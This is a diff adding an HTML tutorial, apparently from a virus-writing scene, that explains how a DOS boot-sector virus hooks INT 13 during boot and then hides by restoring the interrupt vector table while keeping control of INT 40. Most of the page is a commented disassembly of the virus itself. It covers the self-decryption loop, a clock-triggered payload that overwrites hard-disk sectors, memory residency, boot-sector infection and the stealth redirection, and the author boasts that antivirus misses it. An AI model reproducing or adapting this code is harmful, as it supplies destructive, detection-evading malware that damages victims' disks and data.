@@ -1,0 +1,420 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - A different way to make a TSR virus</TITLE>
+   
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+3>A different way to make
+a TSR virus<BR>
+</FONT><FONT SIZE=+1>(or how a boot virus can hook dos interrupts)<BR>
+</FONT><FONT SIZE=+2>by<BR>
+Somniun</FONT></FONT></B></P></CENTER>
+
+<PRE>
+<HR WIDTH="100%"></PRE>
+
+<UL>
+<PRE>For understand this article you need know about:
+
+TSR: Terminate and Stay Resident Programs
+BIOS interrupts and DOS interrupts
+Interrupt Vector Table
+Some of assembler language
+
+Any question feel free send me e-mail at:
+
+    <A HREF="mailto:somniun@hotmail.com">somniun@hotmail.com</A></PRE>
+</UL>
+
+<PRE>
+<HR WIDTH="100%"></PRE>
+
+<UL>
+<PRE>Most TSR virus must hook any Interrupts and must change corresponding
+entry in Vector Table.This have 2 problem , we see its after (*) here.
+Here it's explain a technical by it, a virus can stay resident and no modify
+Vector Table.
+
+Moreover, most boot virus cannot hook DOS interrupts,because when boot-virus
+loads aren't present DOS interrupt ,because dos loads after virus.
+In this example this boot-virus can hook INT 40 (dos int) and in the ended
+of load of virus, it restore a vector table and vector table looks intact.
+
+This technical to be based on the knowledge of next:
+
+In code of some interruptions, there are call to other interrupts, that don't
+do through tipical instruction : INT xx
+in the other way, they use a  CALL FAR [xxxx] ,
+where contents [xxxx] it's a memory directions of a entry point of second
+interrupt called.
+This direction can be resolved during booting proces.
+This way, if a BIOS interrupt (which are loaded before booting process), must
+call a DOS interrupt( loaded during booting process), will have resolved
+direction only after a dos booting.
+
+Then if a virus modify contents of [xxxx], redirection it at his own code,
+when a normal INT (bios int) execute a CALL FAR [xxxx] (calling a dos int),
+ will be execute a virus code.
+
+For example:
+The INT 13 (bios) call to INT 40 (dos) at this way 
+
+                xxxx:xxxx    ???????
+                0070:079c    CALL FAR cs:[00B4]
+                xxxx:xxxx    ???????
+                
+Then if a virus put in 0070:00B4 his entry point, INT 13 will call at code
+virus, and not at INT 40. (This is valid for DOS 5.0 and upper)
+
+For to make this ,a virus must loaded before a booting and to keep watch
+at booting. 
+                                        
+Virus below show, work of this manner:
+
+Is a boot-virus, then it load first, hook INT 13, (at this moment, if we can
+look at vector table,vector table look modify).
+During booting ,DOS call many times at int 13 (inclusive DOS call at INT 19
+who call many time at INT 13), then DOS is calling in fact to virus.
+Then, we can see that all booting proces is controled by this virus, at end
+of booting this virus restore entry point of INT 13, and vector-table look
+intact, but memory position 0070:00B4 remain point to code virus.
+We can see that virus delivered vector table, but virus keep control to
+INT 40 (dos int).
+
+A virus with this characteristic, present difficult detection , because is
+hard found his entry point,a antivirus-research (person) must be follow
+step by step all interrupts, and this is a lot of work.
+Virus show below was encripted, antivirus no detect it, and heuristic mode
+it's useless.                                   
+Moverover, if a virus install a memory handler, for no detect a decrease of
+memory, it would be almost hidden.  
+
+
+(*)Modify vector table has 2 problem
+   1) any antivirus-research (person) first that he do is look at vector table
+      this is proof of presence of virus.
+   2)The action for modify vector table is easy check for AV programs.      
+
+This is part of code virus, of course decripted.
+
+                     data block
+9F70:0000 59            POP     CX           \                      
+9F70:0001 EC            IN      AL,DX        \ adrees old INT 40                     
+9F70:0002 00F0          ADD     AL,DH        \                      
+9F70:0004 53            PUSH    BX                                 
+9F70:0005 44            INC     SP     --------------------------------                            
+9F70:0006 4F            DEC     DI                                 
+9F70:0007 53            PUSH    BX                                 
+9F70:0008 352E30        XOR     AX,302E                            
+9F70:000B 0002          ADD     [BP+SI],AL                         
+9F70:000D 0101          ADD     [BX+DI],AX                         
+9F70:000F 0002          ADD     [BP+SI],AL                         
+9F70:0011 E000          LOOPNZ  0013                               
+9F70:0013 40            INC     AX               data area                  
+9F70:0014 0BF0          OR      SI,AX                              
+9F70:0016 0900          OR      [BX+SI],AX                         
+xxxx:xxxx
+xxxx:xxxx
+xxxx:xxxx        here    more      data     area
+xxxx:xxxx
+xxxx:xxxx
+9F70:003D 200E1FE8      AND     [E81F],CL                          
+9F70:0041 0200          ADD     AL,[BX+SI]
+------------------------------------------------------------------          
+9F70:0043 EB11          JMP     0056    begin of virus when is booting         
+------------------------------------------------------------------
+               routine  for  decryp its code and then encript
+
+9F70:0045 BB567C        MOV     BX,7C56                            
+
+9F70:0048 B9D300        MOV     CX,00D3                            
+9F70:004B 8B07          MOV     AX,[BX]                            
+9F70:004D F7D0          NOT     AX                                 
+9F70:004F 8907          MOV     [BX],AX                            
+9F70:0051 43            INC     BX                                 
+9F70:0052 43            INC     BX                                 
+9F70:0053 E2F6          LOOP    004B                               
+9F70:0055 C3            RET                                  
+----------------------------------------------------------------
+   payload : if condition of timer clock is ..... 
+      
+9F70:0056 B005          MOV     AL,05                              
+9F70:0058 E670          OUT     70,AL                              
+9F70:005A E471          IN      AL,71                              
+9F70:005C FEC0          INC     AL                                 
+9F70:005E E671          OUT     71,AL                              
+9F70:0060 3CFD          CMP     AL,FD                              
+9F70:0062 750F          JNZ     0073                               
+9F70:0064 BA8001        MOV     DX,0180          damage to hard disk                  
+9F70:0067 B80903        MOV     AX,0309                            
+9F70:006A B90100        MOV     CX,0001                            
+9F70:006D CD13          INT     13                                 
+9F70:006F FEC6          INC     DH                                 
+9F70:0071 EBF4          JMP     0067                               
+---------------------------------------------------------------------------
+
+  substract 3 block to ram memory
+
+9F70:0073 A11304        MOV     AX,[0413]                          
+9F70:0076 48            DEC     AX                                 
+9F70:0077 48            DEC     AX                                 
+9F70:0078 48            DEC     AX                                 
+9F70:0079 A31304        MOV     [0413],AX                          
+---------------------------------------------------------------------------
+routine for move code-virus from booting area to top of memory RAM,
+then virus stay resident in this area, ever 9f70
+
+ 
+9F70:007C BE007C        MOV     SI,7C00                            
+9F70:007F 31FF          XOR     DI,DI                              
+9F70:0081 BA709F        MOV     DX,9F70                            
+9F70:0084 52            PUSH    DX                                 
+9F70:0085 07            POP     ES                                 
+9F70:0086 B9FD01        MOV     CX,01FD  size of virus =01fd                          
+9F70:0089 FC            CLD                                        
+9F70:008A F3            REPZ                                       
+9F70:008B A4            MOVSB                               
+
+-------------------------------------------------------------------------
+       
+9F70:008C EA9100709F    JMP     9F70:0091   begin execution in top of memory
+                                            RAM    
+
+---------------------------------------------------------------------------
+point int 13 to its own code
+                                   
+9F70:0091 A14C00        MOV     AX,[004C]                          
+9F70:0094 8B1E4E00      MOV     BX,[004E]                          
+9F70:0098 B9EE01        MOV     CX,01EE
+
+----------------------------------------------------------------------------
+put old adrees of int 13 in its data area
+                            
+9F70:009B 890E4C00      MOV     [004C],CX                          
+9F70:009F 8C0E4E00      MOV     [004E],CS                          
+9F70:00A3 2E            CS:                                        
+9F70:00A4 A30000        MOV     [0000],AX
+9F70:00A7 2E            CS:                                        
+9F70:00A8 891E0200      MOV     [0002],BX                          
+------------------------------------------------------------------------
+
+ go to hard disk write
+ 
+ 
+9F70:00AC B80102        MOV     AX,0201                            
+9F70:00AF BB0002        MOV     BX,0200                            
+9F70:00B2 B90100        MOV     CX,0001                            
+9F70:00B5 90            NOP                                        
+9F70:00B6 BA8001        MOV     DX,0180                            
+9F70:00B9 CD13          INT     13                                 
+9F70:00BB 90            NOP                                        
+-----------------------------------------------------------------------
+    
+    check its signature
+    
+9F70:00BC B80E1F        MOV     AX,1F0E                            
+9F70:00BF 2E            CS:                                        
+9F70:00C0 3B063E02      CMP     AX,[023E]                          
+----------------------------------------------------------------
+various routines for to get boot (of infecteded diskettes) according
+media type.
+ 
+9F70:00C4 752D          JNZ     00F3                               
+9F70:00C6 B8F800        MOV     AX,00F8                            
+9F70:00C9 2E            CS:                                        
+9F70:00CA 3A061500      CMP     AL,[0015]                          
+9F70:00CE 7514          JNZ     00E4                               
+9F70:00D0 B80102        MOV     AX,0201                            
+9F70:00D3 1E            PUSH    DS                                 
+9F70:00D4 07            POP     ES                                 
+9F70:00D5 BB007C        MOV     BX,7C00                            
+9F70:00D8 BA8000        MOV     DX,0080                            
+9F70:00DB B107          MOV     CL,07                              
+9F70:00DD CD13          INT     13                                 
+---------------------------------------------------------------
+execute real boot ,in real boot area, and give control
+
+9F70:00DF EA007C0000    JMP     0000:7C00             
+
+-----------------------------------------------------------------
+others routines for to get infecteded boot
+
+             
+9F70:00E4 B80102        MOV     AX,0201                            
+9F70:00E7 BB007C        MOV     BX,7C00                            
+9F70:00EA 1E            PUSH    DS                                 
+9F70:00EB 07            POP     ES                                 
+9F70:00EC BA0001        MOV     DX,0100                            
+9F70:00EF B10E          MOV     CL,0E                              
+9F70:00F1 EBEA          JMP     00DD                               
+-----------------------------------------------------
+routine for write an infecteded boot in sector 7
+
+9F70:00F3 B80103        MOV     AX,0301                            
+9F70:00F6 B107          MOV     CL,07                              
+9F70:00F8 FECE          DEC     DH                                 
+9F70:00FA CD13          INT     13                   
+
+------------------------------------------------------------              
+9F70:00FC E80200        CALL    0101                               
+9F70:00FF EB22          JMP     0123                               
+9F70:0101 50            PUSH    AX                                 
+9F70:0102 53            PUSH    BX                                 
+9F70:0103 51            PUSH    CX                                 
+9F70:0104 52            PUSH    DX                                 
+9F70:0105 1E            PUSH    DS                                 
+9F70:0106 BA709F        MOV     DX,9F70                            
+9F70:0109 52            PUSH    DX                                 
+9F70:010A 1F            POP     DS                                 
+9F70:010B BE3E00        MOV     SI,003E                            
+9F70:010E BF3E02        MOV     DI,023E                            
+9F70:0111 B9C001        MOV     CX,01C0                            
+9F70:0114 FC            CLD                                        
+9F70:0115 F3            REPZ                                       
+9F70:0116 A4            MOVSB                instruccion for encript code
+9F70:0117 BB5602        MOV     BX,0256      for future write of virus                      
+9F70:011A E82BFF        CALL    0048                               
+9F70:011D 1F            POP     DS                                 
+9F70:011E 5A            POP     DX                                 
+9F70:011F 59            POP     CX                                 
+9F70:0120 5B            POP     BX                                 
+9F70:0121 58            POP     AX                                 
+9F70:0122 C3            RET                                        
+9F70:0123 B80103        MOV     AX,0301                            
+9F70:0126 B101          MOV     CL,01                              
+9F70:0128 FEC6          INC     DH                                 
+9F70:012A CD13          INT     13                                 
+9F70:012C EBB6          JMP     00E4                               
+9F70:012E 50            PUSH    AX                                 
+9F70:012F 53            PUSH    BX                                 
+9F70:0130 51            PUSH    CX                                 
+9F70:0131 52            PUSH    DX                                 
+9F70:0132 1E            PUSH    DS                                 
+9F70:0133 06            PUSH    ES                                 
+9F70:0134 56            PUSH    SI                                 
+9F70:0135 57            PUSH    DI                                 
+9F70:0136 9C            PUSHF                                      
+9F70:0137 29C0          SUB     AX,AX                              
+9F70:0139 8ED8          MOV     DS,AX                              
+9F70:013B 80FA00        CMP     DL,00                              
+9F70:013E 7414          JZ      0154                               
+9F70:0140 80FA01        CMP     DL,01                              
+9F70:0143 7418          JZ      015D                               
+9F70:0145 9D            POPF                                       
+9F70:0146 5F            POP     DI                                 
+9F70:0147 5E            POP     SI                                 
+9F70:0148 07            POP     ES                                 
+9F70:0149 1F            POP     DS                                 
+9F70:014A 5A            POP     DX                                 
+9F70:014B 59            POP     CX                                 
+9F70:014C 5B            POP     BX                                 
+9F70:014D 58            POP     AX                                 
+9F70:014E E81500        CALL    0166                               
+9F70:0151 CA0200        RETF    0002                               
+9F70:0154 F6063F0401    TEST    BYTE PTR [043F],01                 
+9F70:0159 75EA          JNZ     0145                               
+9F70:015B EB10          JMP     016D                               
+9F70:015D F6063F0402    TEST    BYTE PTR [043F],02                 
+9F70:0162 75E1          JNZ     0145                               
+9F70:0164 EB07          JMP     016D                               
+9F70:0166 9C            PUSHF                                      
+------------------------------------------------------------------
+   call to real INT 40 : adrees f000:ec59
+
+9F70:0167 2E            CS:                                        
+9F70:0168 FF1E0000      CALL    FAR [0000]                         
+9F70:016C C3            RET
+------------------------------------------------------------------
+9F70:016D 9D            POPF                                       
+9F70:016E 5F            POP     DI                                 
+9F70:016F 5E            POP     SI                                 
+9F70:0170 07            POP     ES                                 
+9F70:0171 1F            POP     DS                                 
+9F70:0172 5A            POP     DX                                 
+9F70:0173 59            POP     CX                                 
+9F70:0174 5B            POP     BX                                 
+9F70:0175 58            POP     AX                                 
+9F70:0176 E8EDFF        CALL    0166                               
+9F70:0179 50            PUSH    AX                                 
+9F70:017A 53            PUSH    BX                                 
+9F70:017B 51            PUSH    CX                                 
+9F70:017C 52            PUSH    DX                                 
+9F70:017D 1E            PUSH    DS                                 
+9F70:017E 06            PUSH    ES                                 
+9F70:017F 56            PUSH    SI                                 
+9F70:0180 57            PUSH    DI                                 
+9F70:0181 9C            PUSHF                                      
+9F70:0182 0E            PUSH    CS                                 
+9F70:0183 07            POP     ES                                 
+9F70:0184 B80102        MOV     AX,0201                            
+9F70:0187 BB0002        MOV     BX,0200                            
+9F70:018A B90100        MOV     CX,0001                            
+9F70:018D 30F6          XOR     DH,DH                              
+9F70:018F E8D4FF        CALL    0166                               
+9F70:0192 B80E1F        MOV     AX,1F0E     signature                          
+9F70:0195 2E            CS:                                        
+9F70:0196 3B063E02      CMP     AX,[023E]                          
+9F70:019A 74A9          JZ      0145                               
+9F70:019C B80103        MOV     AX,0301                            
+9F70:019F B10E          MOV     CL,0E                              
+9F70:01A1 FEC6          INC     DH                                 
+9F70:01A3 E8C0FF        CALL    0166                               
+9F70:01A6 E858FF        CALL    0101                               
+9F70:01A9 B80103        MOV     AX,0301                            
+9F70:01AC B101          MOV     CL,01                              
+9F70:01AE FECE          DEC     DH                                 
+9F70:01B0 E8B3FF        CALL    0166                               
+9F70:01B3 EB90          JMP     0145                               
+9F70:01B5 9C            PUSHF                                      
+9F70:01B6 3C01          CMP     AL,01                              
+9F70:01B8 7525          JNZ     01DF                               
+9F70:01BA 83F901        CMP     CX,+01                             
+9F70:01BD 7520          JNZ     01DF                               
+9F70:01BF 81FA8001      CMP     DX,0180                            
+9F70:01C3 751A          JNZ     01DF                               
+9F70:01C5 57            PUSH    DI                                 
+9F70:01C6 8CC7          MOV     DI,ES                              
+9F70:01C8 81FF709F      CMP     DI,9F70                            
+9F70:01CC 5F            POP     DI                                 
+9F70:01CD 7410          JZ      01DF                               
+9F70:01CF 57            PUSH    DI                                 
+9F70:01D0 8CC7          MOV     DI,ES                              
+9F70:01D2 83FF00        CMP     DI,+00                             
+9F70:01D5 5F            POP     DI                                 
+9F70:01D6 7407          JZ      01DF                               
+9F70:01D8 80FC03        CMP     AH,03                              
+9F70:01DB 7506          JNZ     01E3                               
+9F70:01DD FEC4          INC     AH                                 
+9F70:01DF 9D            POPF                                       
+9F70:01E0 E94BFF        JMP     012E                               
+9F70:01E3 80FC02        CMP     AH,02                              
+9F70:01E6 75F7          JNZ     01DF                               
+9F70:01E8 B107          MOV     CL,07                              
+9F70:01EA 30F6          XOR     DH,DH                              
+9F70:01EC EBF1          JMP     01DF                 
+
+-----------------------------------------------------------------
+          REAL ENTRY POINT OF CODE VIRUS THAT REPLACE INT 40
+                   
+9F70:01EE 9C            PUSHF                        
+9F70:01EF 80FC05        CMP     AH,05                              
+9F70:01F2 75C2          JNZ     01B6                               
+9F70:01F4 80FA80        CMP     DL,80                              
+9F70:01F7 75BD          JNZ     01B6                               
+9F70:01F9 9D            POPF                                       
+9F70:01FA 30E4          XOR     AH,AH                              
+9F70:01FC CF            IRET                                       
+
+                            
+REGARDS                    SOMNIUN (El sueno) </PRE>
+</UL>
+
+<PRE>
+<HR WIDTH="100%">          
+
+</PRE>
+
+</BODY>
+</HTML>
